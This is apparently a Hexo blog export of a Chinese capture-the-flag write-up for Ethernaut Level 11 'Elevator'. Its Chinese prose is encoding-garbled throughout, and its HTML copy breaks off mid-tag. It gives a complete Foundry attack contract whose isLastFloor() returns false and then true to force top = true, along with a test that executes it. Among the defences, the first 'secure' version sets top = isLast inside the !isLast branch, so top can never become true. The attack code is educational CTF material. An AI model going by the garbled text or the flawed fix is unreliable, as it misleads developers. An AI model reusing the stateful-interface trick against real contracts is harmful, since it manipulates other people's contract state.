æ¥å£çš„å®‰å…¨é£é™©\n\næœ¬å…³å¡é‡åœ¨è€ƒéªŒæˆ‘ä»¬å¯¹æ™ºèƒ½åˆçº¦æ¥å£çš„è®¤çŸ¥ç¨‹åº¦ï¼š\n- **æ¥å£å®šä¹‰å‡½æ•°ç­¾åï¼Œä½†ä¸å®šä¹‰å®ƒä»¬çš„é€»è¾‘**\n- è¿™æ˜¯ä¸€ç§æ— éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹æ³•\n- ä½†ä¹Ÿæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶æ¥å£çš„å®ç°é€»è¾‘\n\n### å…³é”®æ¼æ´ä»£ç \n\n```solidity\nfunction goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (!building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼\n    }\n}\n```\n\n### æ”»å‡»å‘é‡\n\nåœ¨ `goTo` å‡½æ•°ä¸­ï¼Œ`isLastFloor` è¢«è°ƒç”¨ä¸¤æ¬¡ï¼š\n1. **ç¬¬ä¸€æ¬¡è°ƒç”¨**ï¼šå¿…é¡»è¿”å› `false`ï¼Œå¦åˆ™æ— æ³•è¿›å…¥ä¿®æ”¹ `top` çš„é€»è¾‘\n2. **ç¬¬äºŒæ¬¡è°ƒç”¨**ï¼šæˆ‘ä»¬å¯ä»¥è®©å®ƒè¿”å› `true` æ¥è®¾ç½® `top = true`\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ª `isLastFloor()` æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå®ƒå°†ç¬¬ä¸€æ¬¡è¿”å› `false`ï¼Œç¬¬äºŒæ¬¡è¿”å› `true`ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/ElevatorFactory.sol\";\n\ninterface Building {\n    function isLastFloor(uint) external returns (bool);\n}\n\ncontract ElevatorAttacker is Building {\n    Elevator instance;\n    bool top = false;\n\n    constructor(address _elevator) {\n        instance = Elevator(_elevator);\n    }\n\n    // å…³é”®ï¼šçŠ¶æ€å˜åŒ–çš„æ¥å£å®ç°\n    function isLastFloor(uint _floor) external override returns (bool) {\n        top = !top;  // ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ top å˜ä¸º trueï¼Œç¬¬äºŒæ¬¡å˜ä¸º false\n        return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true\n    }\n\n    function attack(uint _floor) public {\n        instance.goTo(_floor);\n    }\n}\n\ncontract ElevatorTest is Test {\n    Ethernaut ethernaut;\n    ElevatorFactory elevatorFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        elevatorFactory = new ElevatorFactory();\n        ethernaut.registerLevel(elevatorFactory);\n    }\n    \n    function testElevatorExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);\n        Elevator instance = Elevator(levelInstance);\n        \n        // æ£€æŸ¥åˆå§‹çŠ¶æ€\n        assertEq(instance.top(), false);\n        assertEq(instance.floor(), 0);\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);\n        \n        // æ‰§è¡Œæ”»å‡»\n        attacker.attack(1);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.top(), true);\n        assertEq(instance.floor(), 1);\n        \n        // æäº¤å…³å¡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **å®ç° Building æ¥å£**ï¼šåˆ›å»ºä¸€ä¸ªåˆçº¦å®ç° `Building` æ¥å£\n2. **çŠ¶æ€å˜åŒ–é€»è¾‘**ï¼šåœ¨ `isLastFloor()` ä¸­å®ç°çŠ¶æ€å˜åŒ–\n3. **è°ƒç”¨ goTo å‡½æ•°**ï¼šé€šè¿‡æ”»å‡»åˆçº¦è°ƒç”¨ `goTo()`\n4. **éªŒè¯ç»“æœ**ï¼šæ£€æŸ¥ `top` æ˜¯å¦ä¸º `true`\n\n```solidity\n// çŠ¶æ€å˜åŒ–çš„å…³é”®å®ç°\nfunction isLastFloor(uint _floor) external override returns (bool) {\n    top = !top;  // åˆ‡æ¢çŠ¶æ€\n    return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šå¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\ncontract VulnerableElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {  // ç¬¬ä¸€æ¬¡è°ƒç”¨\n            floor = _floor;\n            top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼\n        }\n    }\n}\n\n// âœ… å®‰å…¨ï¼šåªè°ƒç”¨ä¸€æ¬¡å¹¶ç¼“å­˜ç»“æœ\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        bool isLast = building.isLastFloor(_floor);  // åªè°ƒç”¨ä¸€æ¬¡\n        \n        if (!isLast) {\n            floor = _floor;\n            top = isLast;  // ä½¿ç”¨ç¼“å­˜çš„ç»“æœ\n        }\n    }\n}\n```\n\n### 2. ä½¿ç”¨ view å‡½æ•°\n\n```solidity\n// âœ… ä½¿ç”¨ view å‡½æ•°é˜²æ­¢çŠ¶æ€æ”¹å˜\ninterface Building {\n    function isLastFloor(uint) external view returns (bool);  // view ä¿®é¥°ç¬¦\n}\n\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);  // view å‡½æ•°ä¿è¯ä¸€è‡´æ€§\n        }\n    }\n}\n```\n\n### 3. ä½¿ç”¨ç™½åå•æœºåˆ¶\n\n```solidity\ncontract SecureElevator {\n    mapping(address => bool) public approvedBuildings;\n    address public owner;\n    \n    modifier onlyApprovedBuilding() {\n        require(approvedBuildings[msg.sender], \"Unauthorized building\");\n        _;\n    }\n    \n    function addApprovedBuilding(address building) public {\n        require(msg.sender == owner);\n        approvedBuildings[building] = true;\n    }\n    \n    function goTo(uint _floor) public onlyApprovedBuilding {\n        // å®‰å…¨é€»è¾‘\n    }\n}\n```\n\n### 4. å®ç°å†…éƒ¨é€»è¾‘\n\n```solidity\ncontract SecureElevator {\n    uint public floor;\n    bool public top;\n    uint public topFloor = 10;  // å®šä¹‰æœ€é«˜å±‚\n    \n    function goTo(uint _floor) public {\n        require(_floor <= topFloor, \"Floor too high\");\n        \n        floor = _floor;\n        top = (_floor == topFloor);  // å†…éƒ¨åˆ¤æ–­é€»è¾‘\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### æ¥å£å®‰å…¨æ£€æµ‹\n\n```solidity\n// æ£€æµ‹æ¥å£å®ç°çš„ä¸€è‡´æ€§\ncontract InterfaceChecker {\n    function checkConsistency(address building, uint floor) public {\n        Building b = Building(building);\n        \n        // å¤šæ¬¡è°ƒç”¨æ£€æŸ¥ä¸€è‡´æ€§\n        bool result1 = b.isLastFloor(floor);\n        bool result2 = b.isLastFloor(floor);\n        \n        require(result1 == result2, \"Inconsistent interface implementation\");\n    }\n}\n```\n\n### åˆçº¦åˆ†æå·¥å…·\n\n```bash\n# ä½¿ç”¨ Slither æ£€æµ‹æ¥å£å®‰å…¨é—®é¢˜\nslither . --detect external-function\n\n# ä½¿ç”¨ Mythril åˆ†æ\nMyth analyze <contract.sol> --execution-timeout 60\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- æ¥å£æ˜¯ä¸€ç§æ— éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹å¼\n- ä½†æ°¸è¿œä¸è¦ç›²ç›®ç›¸ä¿¡å®ƒä»¬ï¼\n- å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°å¯èƒ½äº§ç”Ÿä¸ä¸€è‡´çš„ç»“æœ\n\n**æ”»å‡»å‘é‡**:\n- å®ç°æ¶æ„çš„æ¥å£é€»è¾‘\n- åˆ©ç”¨å¤šæ¬¡è°ƒç”¨ä¹‹é—´çš„çŠ¶æ€å˜åŒ–\n- æ“çºµå‡½æ•°è¿”å›å€¼ä»¥è¾¾åˆ°æ”»å‡»ç›®çš„\n\n**é˜²å¾¡ç­–ç•¥**:\n- åªè°ƒç”¨ä¸€æ¬¡å¤–éƒ¨å‡½æ•°å¹¶ç¼“å­˜ç»“æœ\n- ä½¿ç”¨ `view` å‡½æ•°ä¿®é¥°ç¬¦é˜²æ­¢çŠ¶æ€æ”¹å˜\n- å®ç°ç™½åå•æœºåˆ¶æ§åˆ¶è®¿é—®\n- å°½å¯èƒ½ä½¿ç”¨å†…éƒ¨é€»è¾‘è€Œä¸ä¾èµ–å¤–éƒ¨å®ç°\n\n","slug":"ethernaut-level-11-elevator","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpa000xbf5q70rt10n8","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-11-Elevator-æ¥å£å®ç°æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-11-Elevator-æ¥å£å®ç°æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/11\">Ethernaut Level 11 - Elevator</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ¥å£å®ç°æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ç›®çš„æ˜¯ä½¿ç”µæ¢¯è¾¾åˆ°æœ€é¡¶å±‚ï¼Œå³ä½¿é¢˜ç›®åˆçº¦çš„ <code>top</code> ä¸º <code>true</code>ã€‚å…³é”®åœ¨äºç†è§£æ¥å£å®šä¹‰ä¸å®é™…å®ç°çš„å·®åˆ«ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨è¿™ä¸ªå·®åˆ«è¿›è¡Œæ”»å‡»ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg\" alt=\"Elevator Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"æ¥å£çš„å®‰å…¨é£é™©\"><a href=\"#æ¥å£çš„å®‰å…¨é£é™©\" class=\"headerlink\" title=\"æ¥å£çš„å®‰å…¨é£é™©\"></a>æ¥å£çš„å®‰å…¨é£é™©</h3><p>æœ¬å…³å¡é‡åœ¨è€ƒéªŒæˆ‘ä»¬å¯¹æ™ºèƒ½åˆçº¦æ¥å£çš„è®¤çŸ¥ç¨‹åº¦ï¼š</p>\n<ul>\n<li><strong>æ¥å£å®šä¹‰å‡½æ•°ç­¾åï¼Œä½†ä¸å®šä¹‰å®ƒä»¬çš„é€»è¾‘</strong></li>\n<li>è¿™æ˜¯ä¸€ç§æ— éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹æ³•</li>\n<li>ä½†ä¹Ÿæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶æ¥å£çš„å®ç°é€»è¾‘</li>\n</ul>\n<h3 id=\"å…³é”®æ¼æ´ä»£ç \"><a href=\"#å…³é”®æ¼æ´ä»£ç \" class=\"headerlink\" title=\"å…³é”®æ¼æ´ä»£ç \"></a>å…³é”®æ¼æ´ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function goTo(uint _floor) public &#123;</span><br><span class=\"line\">    Building building = Building(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">      floor = _floor;</span><br><span class=\"line\">      top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»å‘é‡\"><a href=\"#æ”»å‡»å‘é‡\" class=\"headerlink\" title=\"æ”»å‡»å‘é‡\"></a>æ”»å‡»å‘é‡</h3><p>åœ¨ <code>goTo</code> å‡½æ•°ä¸­ï¼Œ<code>isLastFloor</code> è¢«è°ƒç”¨ä¸¤æ¬¡ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨</strong>ï¼šå¿…é¡»è¿”å› <code>false</code>ï¼Œå¦åˆ™æ— æ³•è¿›å…¥ä¿®æ”¹ <code>top</code> çš„é€»è¾‘</li>\n<li><strong>ç¬¬äºŒæ¬¡è°ƒç”¨</strong>ï¼šæˆ‘ä»¬å¯ä»¥è®©å®ƒè¿”å› <code>true</code> æ¥è®¾ç½® <code>top = true</code></li>\n</ol>\n<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ª <code>isLastFloor()</code> æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå®ƒå°†ç¬¬ä¸€æ¬¡è¿”å› <code>false</code>ï¼Œç¬¬äºŒæ¬¡è¿”å› <code>true</code>ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/ElevatorFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external returns (bool);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorAttacker is Building &#123;</span><br><span class=\"line\">    Elevator instance;</span><br><span class=\"line\">    bool top = false;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _elevator) &#123;</span><br><span class=\"line\">        instance = Elevator(_elevator);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // å…³é”®ï¼šçŠ¶æ€å˜åŒ–çš„æ¥å£å®ç°</span><br><span class=\"line\">    function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">        top = !top;  // ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ top å˜ä¸º trueï¼Œç¬¬äºŒæ¬¡å˜ä¸º false</span><br><span class=\"line\">        return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack(uint _floor) public &#123;</span><br><span class=\"line\">        instance.goTo(_floor);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    ElevatorFactory elevatorFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        elevatorFactory = new ElevatorFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(elevatorFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testElevatorExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);</span><br><span class=\"line\">        Elevator instance = Elevator(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æŸ¥åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        assertEq(instance.top(), false);</span><br><span class=\"line\">        assertEq(instance.floor(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œæ”»å‡»</span><br><span class=\"line\">        attacker.attack(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.top(), true);</span><br><span class=\"line\">        assertEq(instance.floor(), 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤å…³å¡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>å®ç° Building æ¥å£</strong>ï¼šåˆ›å»ºä¸€ä¸ªåˆçº¦å®ç° <code>Building</code> æ¥å£</li>\n<li><strong>çŠ¶æ€å˜åŒ–é€»è¾‘</strong>ï¼šåœ¨ <code>isLastFloor()</code> ä¸­å®ç°çŠ¶æ€å˜åŒ–</li>\n<li><strong>è°ƒç”¨ goTo å‡½æ•°</strong>ï¼šé€šè¿‡æ”»å‡»åˆçº¦è°ƒç”¨ <code>goTo()</code></li>\n<li><strong>éªŒè¯ç»“æœ</strong>ï¼šæ£€æŸ¥ <code>top</code> æ˜¯å¦ä¸º <code>true</code></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// çŠ¶æ€å˜åŒ–çš„å…³é”®å®ç°</span><br><span class=\"line\">function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">    top = !top;  // åˆ‡æ¢çŠ¶æ€</span><br><span class=\"line\">    return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\"><a href=\"#1-é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\" class=\"headerlink\" title=\"1. é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\"></a>1. é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šå¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°</span><br><span class=\"line\">contract VulnerableElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;  // ç¬¬ä¸€æ¬¡è°ƒç”¨</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šåªè°ƒç”¨ä¸€æ¬¡å¹¶ç¼“å­˜ç»“æœ</span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bool isLast = building.isLastFloor(_floor);  // åªè°ƒç”¨ä¸€æ¬¡</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!isLast) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = isLast;  // ä½¿ç”¨ç¼“å­˜çš„ç»“æœ</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-view-å‡½æ•°\"><a href=\"#2-ä½¿ç”¨-view-å‡½æ•°\" class=\"headerlink\" title=\"2. ä½¿ç”¨ view å‡½æ•°\"></a>2. ä½¿ç”¨ view å‡½æ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âœ… ä½¿ç”¨ view å‡½æ•°é˜²æ­¢çŠ¶æ€æ”¹å˜</span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external view returns (bool);  // view ä¿®é¥°ç¬¦</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // view å‡½æ•°ä¿è¯ä¸€è‡´æ€§</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä½¿ç”¨ç™½åå•æœºåˆ¶\"><a href=\"#3-ä½¿ç”¨ç™½åå•æœºåˆ¶\" class=\"headerlink\" title=\"3. ä½¿ç”¨ç™½åå•æœºåˆ¶\"></a>3. ä½¿ç”¨ç™½åå•æœºåˆ¶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    mapping(address =&gt; bool) public approvedBuildings;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyApprovedBuilding() &#123;</span><br><span class=\"line\">        require(approvedBuildings[msg.sender], &quot;Unauthorized building&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function addApprovedBuilding(address building) public &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        approvedBuildings[building] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public onlyApprovedBuilding &#123;</span><br><span class=\"line\">        // å®‰å…¨é€»è¾‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-å®ç°å†…éƒ¨é€»è¾‘\"><a href=\"#4-å®ç°å†…éƒ¨é€»è¾‘\" class=\"headerlink\" title=\"4. å®ç°å†…éƒ¨é€»è¾‘\"></a>4. å®ç°å†…éƒ¨é€»è¾‘</h3><figure class=\"highlight 